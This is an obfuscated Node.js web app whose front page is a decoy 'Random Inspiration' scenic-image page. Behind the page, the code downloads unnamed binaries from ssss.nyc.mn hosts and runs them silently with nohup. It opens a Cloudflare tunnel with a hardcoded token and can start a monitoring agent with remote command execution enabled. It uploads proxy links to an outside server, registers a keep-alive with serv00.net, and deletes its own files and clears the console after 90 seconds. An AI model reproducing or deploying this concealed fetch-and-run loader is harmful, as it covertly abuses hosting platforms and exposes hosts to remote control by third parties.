'use strict';const _0x1153bb=_0x527f;(function(_0x5e34ec,_0x5df616){const _0x45df45=_0x527f,_0xb535fc=_0x5e34ec();while(!![]){try{const _0x237042=-parseInt(_0x45df45(0xfc))/0x1*(parseInt(_0x45df45(0xea))/0x2)+parseInt(_0x45df45(0xad))/0x3+-parseInt(_0x45df45(0x101))/0x4*(parseInt(_0x45df45(0x89))/0x5)+parseInt(_0x45df45(0x9e))/0x6*(parseInt(_0x45df45(0x87))/0x7)+parseInt(_0x45df45(0x92))/0x8*(parseInt(_0x45df45(0xda))/0x9)+parseInt(_0x45df45(0xaf))/0xa*(parseInt(_0x45df45(0xf0))/0xb)+parseInt(_0x45df45(0x10b))/0xc;if(_0x237042===_0x5df616)break;else _0xb535fc['push'](_0xb535fc['shift']());}catch(_0x552cb7){_0xb535fc['push'](_0xb535fc['shift']());}}}(_0x20c0,0x1a492));function _0x20c0(){const _0x12fd91=['770VfBDmb','--tls','NEZHA_PORT','client_secret:\x20','PORT','status','-----\x20Subscription\x20Content\x20Ready\x20-----','arm64','base64','1614584mbVkJj','HTTP\x20server\x20is\x20running\x20on\x20port:\x20','then','mkdirSync','An\x20error\x20occurred\x20during\x20startup:','none','ARGO_AUTH','\x0aprotocol:\x20http2\x0aingress:\x0a\x20\x20-\x20hostname:\x20','\x20>/dev/null\x202>&1','tcp','quic','unlink','72vxTzAX','forEach','chmod\x20775\x20','tunnel.json','charAt','vless','get','match','includes','blackhole','arm','data','vmess','\x20successfully','PROJECT_URL','190773jakVbd','basename','50dYmIuX','Argo\x20tunnel\x20is\x20running','dade9724-96d2-461e-9846-61bf68b9d401','tunnel.yml','exec','unlinkSync','2096','type','ARGO_DOMAIN','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atls:\x20','listen','random','/vmess-argo?ed=2560','axios','vless://','127.0.0.1','message','\x20failed:\x20','&fp=firefox&type=ws&host=','Failed\x20to\x20upload\x20subscription:','direct','push','nohup\x20','AUTO_ACCESS','\x20-p\x20','/trojan-argo','SERVER_PORT','createWriteStream','toString','Argo\x20running\x20error:\x20','/vless-argo','boot.log','express','utf-8','?encryption=none&security=tls&sni=','\x20run','stringify','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','2083','floor','\x0a\x20\x20<!DOCTYPE\x20html>\x0a\x20\x20<html\x20lang=\x22en\x22>\x0a\x20\x20<head>\x0a\x20\x20\x20\x20\x20\x20<meta\x20charset=\x22UTF-8\x22>\x0a\x20\x20\x20\x20\x20\x20<meta\x20name=\x22viewport\x22\x20content=\x22width=device-width,\x20initial-scale=1.0\x22>\x0a\x20\x20\x20\x20\x20\x20<title>Random\x20Inspiration</title>\x0a\x20\x20\x20\x20\x20\x20<style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20@import\x20url(\x27https://fonts.googleapis.com/css2?family=Merriweather:wght@300;700&display=swap\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20body\x20{\x20margin:\x200;\x20font-family:\x20\x27Merriweather\x27,\x20serif;\x20background-color:\x20#121212;\x20color:\x20#fff;\x20height:\x20100vh;\x20display:\x20flex;\x20flex-direction:\x20column;\x20justify-content:\x20center;\x20align-items:\x20center;\x20overflow:\x20hidden;\x20text-align:\x20center;\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.container\x20{\x20width:\x2090%;\x20max-width:\x201200px;\x20height:\x2080%;\x20position:\x20relative;\x20box-shadow:\x200\x2010px\x2030px\x20rgba(0,\x200,\x200,\x200.5);\x20border-radius:\x208px;\x20overflow:\x20hidden;\x20display:\x20flex;\x20justify-content:\x20center;\x20align-items:\x20center;\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20#bg-image\x20{\x20width:\x20100%;\x20height:\x20100%;\x20object-fit:\x20cover;\x20transition:\x20opacity\x201s\x20ease-in-out;\x20opacity:\x200;\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.overlay-text\x20{\x20position:\x20absolute;\x20z-index:\x202;\x20padding:\x2020px;\x20background:\x20rgba(0,\x200,\x200,\x200.4);\x20border-radius:\x205px;\x20opacity:\x200;\x20transition:\x20opacity\x200.3s\x20ease-in-out;\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.container:hover\x20.overlay-text\x20{\x20opacity:\x201;\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20h1\x20{\x20font-size:\x202.5rem;\x20margin:\x200\x200\x2010px\x200;\x20font-weight:\x20700;\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20p\x20{\x20font-size:\x201.2rem;\x20font-weight:\x20300;\x20margin:\x200;\x20opacity:\x200.9;\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20footer\x20{\x20margin-top:\x2020px;\x20font-size:\x200.9rem;\x20opacity:\x200.6;\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20footer\x20a\x20{\x20color:\x20#87CEEB;\x20text-decoration:\x20none;\x20}\x0a\x20\x20\x20\x20\x20\x20</style>\x0a\x20\x20</head>\x0a\x20\x20<body>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20id=\x22bg-image\x22\x20alt=\x22Random\x20scenic\x20view\x22\x20/>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22overlay-text\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1>A\x20Moment\x20of\x20Zen</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>Refresh\x20for\x20a\x20new\x20perspective.</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20<footer>Images\x20from\x20<a\x20href=\x22https://picsum.photos/\x22\x20target=\x22_blank\x22>Lorem\x20Picsum</a></footer>\x0a\x20\x20\x20\x20\x20\x20<script>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20document.addEventListener(\x22DOMContentLoaded\x22,\x20function()\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20img\x20=\x20document.getElementById(\x27bg-image\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20container\x20=\x20document.querySelector(\x27.container\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20width\x20=\x20Math.floor(container.clientWidth);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20height\x20=\x20Math.floor(container.clientHeight);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20img.src\x20=\x20\x27https://picsum.photos/\x27\x20+\x20width\x20+\x20\x27/\x27\x20+\x20height\x20+\x20\x27?random=\x27\x20+\x20Math.random();\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20img.onload\x20=\x20function()\x20{\x20img.style.opacity\x20=\x20\x271\x27;\x20};\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20});\x0a\x20\x20\x20\x20\x20\x20</script>\x0a\x20\x20</body>\x0a\x20\x20</html>\x0a\x20\x20','from','2053','9MPkCSZ','CFIP','agent','2087','filter','/dev/null','UPLOAD_URL','child_process','error','eyJhIjoiOGNhOTliOWUyNjc1YmMxMzRlMGM1YjA4NWQzYTk0MzkiLCJ0IjoiMzdhYTM4MDctMWM1NC00OGZmLTgwYzAtM2NhMjY0YWYzYzZlIiwicyI6IllXWmpZams1WXpVdFpURXdZaTAwWVdRNUxUbGlaamd0TnpnMll6RXlOalV3WkRRMSJ9','aarch64','finish','amd64','vmess://','./tmp','text/plain;\x20charset=utf-8','6672QrkVcS','false','Nezha\x20agent\x20is\x20running','App\x20is\x20running.\x20Setup\x20complete.','response','tls','157641UYJkZG','existsSync','post','sub.txt','config.yaml','join','path','tunnel:\x20','bk.0407123.xyz','&path=%2Fvless-argo%3Fed%3D2560#','Keep-alive\x20task\x20added\x20successfully','443','59HMFYua','\x22\x20>/dev/null\x202>&1\x20&','Subscription\x20uploaded\x20successfully','\x20-s\x20','\x20-c\x20\x22','3268EdTdLX','.ssss.nyc.mn/','&path=%2Ftrojan-argo%3Fed%3D2560#','\x0a\x20\x20\x20\x20service:\x20http://localhost:','/api/delete-nodes','pipe','/vmess-argo','log','application/json','send','182148BwBEWh','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','split','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','\x0acredentials-file:\x20','firefox','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0ainsecure_tls:\x20true\x0areport_delay:\x204\x0aserver:\x20','fileName','qianxiuadmin','Failed\x20to\x20upload\x20nodes:','arch','stream','.ssss.nyc.mn/web','\x0a\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20-\x20service:\x20http_status:404','Nezha\x20running\x20error:\x20','FILE_PATH','Using\x20default\x20or\x20env\x20domain.','NEZHA_KEY','all','http','abcdefghijklmnopqrstuvwxyz','https://','catch','\x20--loglevel\x20info\x20--url\x20http://localhost:','env','8443','freedom','writeFileSync','\x0auuid:\x20','\x20>/dev/null\x202>&1\x20&','map','45535mRBaRv','https://oooo.serv00.net/add-url'];_0x20c0=function(){return _0x12fd91;};return _0x20c0();}const express=require(_0x1153bb(0xcf)),app=express(),axios=require(_0x1153bb(0xbc)),os=require('os'),fs=require('fs'),path=require(_0x1153bb(0xf6)),{promisify}=require('util'),exec=promisify(require(_0x1153bb(0xe1))[_0x1153bb(0xb3)]),{execSync}=require(_0x1153bb(0xe1)),UPLOAD_URL=process[_0x1153bb(0x80)][_0x1153bb(0xe0)]||'',PROJECT_URL=process[_0x1153bb(0x80)][_0x1153bb(0xac)]||'',AUTO_ACCESS=process[_0x1153bb(0x80)][_0x1153bb(0xc6)]||![],FILE_PATH=process[_0x1153bb(0x80)][_0x1153bb(0x11a)]||_0x1153bb(0xe8),SUB_PATH=process[_0x1153bb(0x80)]['SUB_PATH']||_0x1153bb(0x113),PORT=process[_0x1153bb(0x80)][_0x1153bb(0xc9)]||process[_0x1153bb(0x80)][_0x1153bb(0x8d)]||0xbb8,UUID=process[_0x1153bb(0x80)]['UUID']||_0x1153bb(0xb1),NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process['env'][_0x1153bb(0x8b)]||'',NEZHA_KEY=process[_0x1153bb(0x80)][_0x1153bb(0x79)]||'',ARGO_DOMAIN=process[_0x1153bb(0x80)][_0x1153bb(0xb7)]||'railway.d.4.8.b.0.d.0.0.1.0.a.2.ip6.arpa',ARGO_AUTH=process[_0x1153bb(0x80)][_0x1153bb(0x98)]||_0x1153bb(0xe3),ARGO_PORT=process[_0x1153bb(0x80)]['ARGO_PORT']||0x1f41,CFIP=process[_0x1153bb(0x80)][_0x1153bb(0xdb)]||_0x1153bb(0xf8),CFPORT=process['env']['CFPORT']||0x1bb,NAME=process[_0x1153bb(0x80)]['NAME']||'';!fs['existsSync'](FILE_PATH)&&fs[_0x1153bb(0x95)](FILE_PATH);function generateRandomName(){const _0x3f1160=_0x1153bb;let _0x38e645='';for(let _0x31b53a=0x0;_0x31b53a<0x6;_0x31b53a++){_0x38e645+=_0x3f1160(0x7c)[_0x3f1160(0xa2)](Math[_0x3f1160(0xd6)](Math[_0x3f1160(0xba)]()*0x1a));}return _0x38e645;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();function _0x527f(_0x24d32d,_0x4630e6){const _0x20c047=_0x20c0();return _0x527f=function(_0x527f4e,_0x519bb5){_0x527f4e=_0x527f4e-0x78;let _0x11aa15=_0x20c047[_0x527f4e];return _0x11aa15;},_0x527f(_0x24d32d,_0x4630e6);}let npmPath=path[_0x1153bb(0xf5)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x1153bb(0xf5)](FILE_PATH,botName),subPath=path[_0x1153bb(0xf5)](FILE_PATH,_0x1153bb(0xf3)),bootLogPath=path['join'](FILE_PATH,_0x1153bb(0xce)),configPath=path[_0x1153bb(0xf5)](FILE_PATH,'config.json'),subscriptionContent='Subscription\x20content\x20is\x20generating,\x20please\x20try\x20again\x20in\x20a\x20few\x20seconds...';app['get']('/',function(_0x1ae179,_0x553c07){const _0x2131c2=_0x1153bb,_0x3b9ed2=_0x2131c2(0xd7);_0x553c07[_0x2131c2(0x10a)](_0x3b9ed2);}),app[_0x1153bb(0xa4)]('/'+SUB_PATH,(_0x1f69d7,_0x251b07)=>{const _0x37f037=_0x1153bb;_0x251b07[_0x37f037(0xb6)](_0x37f037(0xe9))['send'](subscriptionContent);});async function generateConfig(){const _0x5b31e8=_0x1153bb,_0x1d320e={'log':{'access':_0x5b31e8(0xdf),'error':_0x5b31e8(0xdf),'loglevel':_0x5b31e8(0x97)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x5b31e8(0x97),'fallbacks':[{'dest':0xbb9,'xver':0x1},{'path':_0x5b31e8(0xcd),'dest':0xbba},{'path':_0x5b31e8(0x107),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x5b31e8(0x9b)}},{'port':0xbb9,'listen':_0x5b31e8(0xbe),'protocol':_0x5b31e8(0xa3),'settings':{'clients':[{'id':UUID}],'decryption':_0x5b31e8(0x97)},'streamSettings':{'network':'tcp','security':_0x5b31e8(0x97)}},{'port':0xbba,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x5b31e8(0x97)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x5b31e8(0x9c)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x5b31e8(0xbe),'protocol':_0x5b31e8(0xaa),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x5b31e8(0x107)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x5b31e8(0xef),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x5b31e8(0x97),'wsSettings':{'path':_0x5b31e8(0xc8)}},'sniffing':{'enabled':!![],'destOverride':[_0x5b31e8(0x7b),'tls','quic'],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x5b31e8(0x82),'tag':_0x5b31e8(0xc3)},{'protocol':_0x5b31e8(0xa7),'tag':'block'}]};fs[_0x5b31e8(0x83)](configPath,JSON[_0x5b31e8(0xd3)](_0x1d320e,null,0x2));}function deleteNodes(){const _0x4dcda1=_0x1153bb;try{if(!UPLOAD_URL||!fs[_0x4dcda1(0xf1)](subPath))return;const _0x2cb0e0=fs['readFileSync'](subPath,'utf-8'),_0x28bb60=Buffer[_0x4dcda1(0xd8)](_0x2cb0e0,_0x4dcda1(0x91))['toString'](_0x4dcda1(0xd0)),_0x26c65c=_0x28bb60[_0x4dcda1(0x10d)]('\x0a')[_0x4dcda1(0xde)](_0x289aa1=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x289aa1));_0x26c65c['length']>0x0&&axios[_0x4dcda1(0xf2)](UPLOAD_URL+_0x4dcda1(0x105),JSON['stringify']({'nodes':_0x26c65c}),{'headers':{'Content-Type':_0x4dcda1(0x109)}})[_0x4dcda1(0x7e)](()=>{});}catch(_0x3404be){}}function cleanupOldFiles(){const _0x339e22=_0x1153bb;try{fs['readdirSync'](FILE_PATH)[_0x339e22(0x9f)](_0x3a3dbe=>{const _0x57c89d=_0x339e22;try{fs[_0x57c89d(0xb4)](path[_0x57c89d(0xf5)](FILE_PATH,_0x3a3dbe));}catch(_0x28736e){}});}catch(_0x594ea6){}}function getSystemArchitecture(){const _0xe692d2=_0x1153bb;return os['arch']()[_0xe692d2(0xa6)](_0xe692d2(0xa8))||os[_0xe692d2(0x115)]()[_0xe692d2(0xa6)](_0xe692d2(0xe4))?_0xe692d2(0xa8):'amd';}function downloadFile(_0x53d981,_0x1edef1,_0x4170c2){const _0x311668=_0x1153bb,_0x539318=fs[_0x311668(0xca)](_0x53d981);axios({'method':_0x311668(0xa4),'url':_0x1edef1,'responseType':_0x311668(0x116)})[_0x311668(0x94)](_0x5be500=>{const _0x3174d4=_0x311668;_0x5be500[_0x3174d4(0xa9)][_0x3174d4(0x106)](_0x539318),_0x539318['on'](_0x3174d4(0xe5),()=>{const _0x35f039=_0x3174d4;_0x539318['close'](),console[_0x35f039(0x108)]('Download\x20'+path[_0x35f039(0xae)](_0x53d981)+_0x35f039(0xab)),_0x4170c2(null,_0x53d981);});})[_0x311668(0x7e)](_0x23f25f=>{const _0x2119df=_0x311668;_0x539318['close'](),fs[_0x2119df(0x9d)](_0x53d981,()=>{}),console[_0x2119df(0xe2)]('Download\x20'+path['basename'](_0x53d981)+_0x2119df(0xc0)+_0x23f25f[_0x2119df(0xbf)]),_0x4170c2(_0x23f25f[_0x2119df(0xbf)]);});}async function downloadAndRun(){const _0x4731c1=_0x1153bb,_0x824dc3=getSystemArchitecture(),_0x5d7be2=getFilesForArchitecture(_0x824dc3);await Promise[_0x4731c1(0x7a)](_0x5d7be2[_0x4731c1(0x86)](_0x313fab=>new Promise((_0x309642,_0x3deb57)=>downloadFile(_0x313fab[_0x4731c1(0x112)],_0x313fab['fileUrl'],_0x5b3053=>_0x5b3053?_0x3deb57(_0x5b3053):_0x309642())))),execSync(_0x4731c1(0xa0)+(NEZHA_PORT?[npmPath,webPath,botPath][_0x4731c1(0xf5)]('\x20'):[phpPath,webPath,botPath][_0x4731c1(0xf5)]('\x20')));if(NEZHA_SERVER&&NEZHA_KEY){let _0x18b85f;if(!NEZHA_PORT){const _0x4f541e=[_0x4731c1(0xfb),_0x4731c1(0x81),_0x4731c1(0xb5),_0x4731c1(0xdd),_0x4731c1(0xd5),'2053'][_0x4731c1(0xa6)](NEZHA_SERVER[_0x4731c1(0x10d)](':')['pop']())?'true':_0x4731c1(0xeb);fs[_0x4731c1(0x83)](path[_0x4731c1(0xf5)](FILE_PATH,_0x4731c1(0xf4)),_0x4731c1(0x8c)+NEZHA_KEY+_0x4731c1(0x111)+NEZHA_SERVER+_0x4731c1(0xb8)+_0x4f541e+_0x4731c1(0x84)+UUID),_0x18b85f=_0x4731c1(0xc5)+phpPath+_0x4731c1(0x100)+path['join'](FILE_PATH,_0x4731c1(0xf4))+_0x4731c1(0xfd);}else{const _0x3af510=[_0x4731c1(0xfb),'8443',_0x4731c1(0xb5),_0x4731c1(0xdd),_0x4731c1(0xd5),_0x4731c1(0xd9)][_0x4731c1(0xa6)](NEZHA_PORT)?_0x4731c1(0x8a):'';_0x18b85f=_0x4731c1(0xc5)+npmPath+_0x4731c1(0xff)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4731c1(0xc7)+NEZHA_KEY+'\x20'+_0x3af510+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}try{await exec(_0x18b85f),console[_0x4731c1(0x108)](_0x4731c1(0xec));}catch(_0x2b64d7){console[_0x4731c1(0xe2)](_0x4731c1(0x119)+_0x2b64d7);}}try{await exec(_0x4731c1(0xc5)+webPath+'\x20-c\x20'+configPath+'\x20>/dev/null\x202>&1\x20&'),console[_0x4731c1(0x108)]('Web\x20core\x20is\x20running');}catch(_0x1dc3d5){console['error']('Web\x20running\x20error:\x20'+_0x1dc3d5);}let _0x481e7d;if(ARGO_AUTH[_0x4731c1(0xa5)](/^[A-Z0-9a-z=]{120,250}$/))_0x481e7d=_0x4731c1(0x10e)+ARGO_AUTH;else{if(ARGO_AUTH[_0x4731c1(0xa5)](/TunnelSecret/)){fs[_0x4731c1(0x83)](path['join'](FILE_PATH,_0x4731c1(0xa1)),ARGO_AUTH);const _0x406b6f=ARGO_AUTH['split']('\x22')[0xb];fs[_0x4731c1(0x83)](path[_0x4731c1(0xf5)](FILE_PATH,'tunnel.yml'),_0x4731c1(0xf7)+_0x406b6f+_0x4731c1(0x10f)+path[_0x4731c1(0xf5)](FILE_PATH,_0x4731c1(0xa1))+_0x4731c1(0x99)+ARGO_DOMAIN+_0x4731c1(0x104)+ARGO_PORT+_0x4731c1(0x118)),_0x481e7d=_0x4731c1(0xd4)+path[_0x4731c1(0xf5)](FILE_PATH,_0x4731c1(0xb2))+_0x4731c1(0xd2);}else _0x481e7d=_0x4731c1(0x10c)+bootLogPath+_0x4731c1(0x7f)+ARGO_PORT;}try{await exec(_0x4731c1(0xc5)+botPath+'\x20'+_0x481e7d+_0x4731c1(0x85)),console['log'](_0x4731c1(0xb0));}catch(_0x4cfd1a){console[_0x4731c1(0xe2)](_0x4731c1(0xcc)+_0x4cfd1a);}}function getFilesForArchitecture(_0x251b26){const _0x571d79=_0x1153bb;let _0x4f2231=[{'fileName':webPath,'fileUrl':_0x571d79(0x7d)+(_0x251b26===_0x571d79(0xa8)?_0x571d79(0x90):_0x571d79(0xe6))+_0x571d79(0x117)},{'fileName':botPath,'fileUrl':_0x571d79(0x7d)+(_0x251b26===_0x571d79(0xa8)?_0x571d79(0x90):'amd64')+'.ssss.nyc.mn/bot'}];return NEZHA_SERVER&&NEZHA_KEY&&_0x4f2231[_0x571d79(0xc4)]({'fileName':NEZHA_PORT?npmPath:phpPath,'fileUrl':_0x571d79(0x7d)+(_0x251b26===_0x571d79(0xa8)?'arm64':_0x571d79(0xe6))+_0x571d79(0x102)+(NEZHA_PORT?_0x571d79(0xdc):'v1')}),_0x4f2231;}async function extractDomainAndGenerateLinks(){const _0x16f33b=_0x1153bb;await new Promise(_0x52d175=>setTimeout(_0x52d175,0x1388));let _0x195c22=ARGO_DOMAIN;if(!ARGO_AUTH[_0x16f33b(0xa5)](/^[A-Z0-9a-z=]{120,250}$/)&&!ARGO_AUTH[_0x16f33b(0xa5)](/TunnelSecret/))try{const _0x2a0b36=fs['readFileSync'](bootLogPath,'utf-8'),_0x4a0bdc=_0x2a0b36[_0x16f33b(0xa5)](/https?:\/\/([^ ]*trycloudflare\.com)/);if(_0x4a0bdc)_0x195c22=_0x4a0bdc[0x1];}catch(_0x3a6d1a){console['log'](_0x16f33b(0x78));}console['log']('Using\x20domain:',_0x195c22);const _0x4d6536=execSync('curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':_0x16f33b(0xd0)})['trim'](),_0x12c20a=NAME?NAME+'-'+_0x4d6536:_0x4d6536,_0x3ab3a9={'v':'2','ps':_0x12c20a,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x16f33b(0x97),'net':'ws','type':_0x16f33b(0x97),'host':_0x195c22,'path':_0x16f33b(0xbb),'tls':_0x16f33b(0xef),'sni':_0x195c22,'alpn':'','fp':_0x16f33b(0x110)},_0x351e09=[_0x16f33b(0xbd)+UUID+'@'+CFIP+':'+CFPORT+_0x16f33b(0xd1)+_0x195c22+_0x16f33b(0xc1)+_0x195c22+_0x16f33b(0xf9)+_0x12c20a,_0x16f33b(0xe7)+Buffer[_0x16f33b(0xd8)](JSON[_0x16f33b(0xd3)](_0x3ab3a9))[_0x16f33b(0xcb)](_0x16f33b(0x91)),'trojan://'+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x195c22+_0x16f33b(0xc1)+_0x195c22+_0x16f33b(0x103)+_0x12c20a][_0x16f33b(0xf5)]('\x0a\x0a'),_0xeab5e=Buffer[_0x16f33b(0xd8)](_0x351e09)[_0x16f33b(0xcb)](_0x16f33b(0x91));subscriptionContent=_0xeab5e,console[_0x16f33b(0x108)](_0x16f33b(0x8f)),fs[_0x16f33b(0x83)](subPath,_0xeab5e),await uploadSubscription(_0x351e09);}async function uploadSubscription(_0x102b58){const _0x27ceb3=_0x1153bb;if(!UPLOAD_URL)return;const _0x5e7fe2={};if(PROJECT_URL){_0x5e7fe2['subscription']=[PROJECT_URL+'/'+SUB_PATH];try{await axios['post'](UPLOAD_URL+'/api/add-subscriptions',_0x5e7fe2,{'headers':{'Content-Type':_0x27ceb3(0x109)}}),console[_0x27ceb3(0x108)](_0x27ceb3(0xfe));}catch(_0x582b12){if(_0x582b12[_0x27ceb3(0xee)]&&_0x582b12['response'][_0x27ceb3(0x8e)]!==0x190)console[_0x27ceb3(0xe2)](_0x27ceb3(0xc2),_0x582b12[_0x27ceb3(0xbf)]);}}else{_0x5e7fe2['nodes']=_0x102b58[_0x27ceb3(0x10d)]('\x0a\x0a')[_0x27ceb3(0xde)](Boolean);try{await axios[_0x27ceb3(0xf2)](UPLOAD_URL+'/api/add-nodes',_0x5e7fe2,{'headers':{'Content-Type':_0x27ceb3(0x109)}}),console[_0x27ceb3(0x108)]('Nodes\x20uploaded\x20successfully');}catch(_0x156bed){console[_0x27ceb3(0xe2)](_0x27ceb3(0x114),_0x156bed[_0x27ceb3(0xbf)]);}}}async function keepAlive(){const _0x41a0b8=_0x1153bb;if(AUTO_ACCESS&&PROJECT_URL)try{await axios[_0x41a0b8(0xf2)](_0x41a0b8(0x88),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}}),console[_0x41a0b8(0x108)](_0x41a0b8(0xfa));}catch(_0x4bddc4){console[_0x41a0b8(0xe2)]('Failed\x20to\x20add\x20keep-alive\x20task:',_0x4bddc4[_0x41a0b8(0xbf)]);}}function cleanUpLater(){setTimeout(()=>{const _0x4a5710=_0x527f,_0x1a9f9b=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath,path[_0x4a5710(0xf5)](FILE_PATH,_0x4a5710(0xa1)),path[_0x4a5710(0xf5)](FILE_PATH,_0x4a5710(0xb2)),path['join'](FILE_PATH,_0x4a5710(0xf4))];exec('rm\x20-f\x20'+_0x1a9f9b[_0x4a5710(0xde)](fs[_0x4a5710(0xf1)])['join']('\x20')+_0x4a5710(0x9a),()=>{const _0x10f8f1=_0x4a5710;console['clear'](),console['log'](_0x10f8f1(0xed));});},0x15f90);}async function main(){const _0x2eeb10=_0x1153bb;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadAndRun(),await extractDomainAndGenerateLinks(),await keepAlive(),cleanUpLater();}catch(_0x4eed20){console[_0x2eeb10(0xe2)](_0x2eeb10(0x96),_0x4eed20);}}main(),app[_0x1153bb(0xb9)](PORT,()=>console['log'](_0x1153bb(0x93)+PORT+'!'));
